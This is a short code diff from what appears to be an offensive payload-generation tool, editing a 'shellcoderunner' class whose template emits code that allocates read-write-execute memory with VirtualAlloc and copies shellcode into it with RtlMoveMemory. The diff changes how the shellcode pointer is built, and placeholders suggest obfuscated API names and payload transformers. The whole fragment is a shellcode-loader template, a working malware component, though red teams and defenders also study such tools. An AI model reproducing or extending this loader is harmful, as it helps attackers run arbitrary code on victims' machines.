@@ -16,12 +16,9 @@ class shellcoderunner:
 
     def template(self) -> str:
         return """
-
-    local shellcodeArray = c.Array("c", 1, {shellcodeSize})
     {transformers}
-    local shellcodeBytes = shellcodeArray {{ shellcode }}
     local address = {VirtualAlloc}(c.NULL, 460, 0x3000, 0x40)
-    local ptr = c.Pointer(shellcodeBytes[0])
+    local ptr = c.Pointer(shellcode[0])
 
     {RtlMoveMemory}(address, ptr, 460)
 
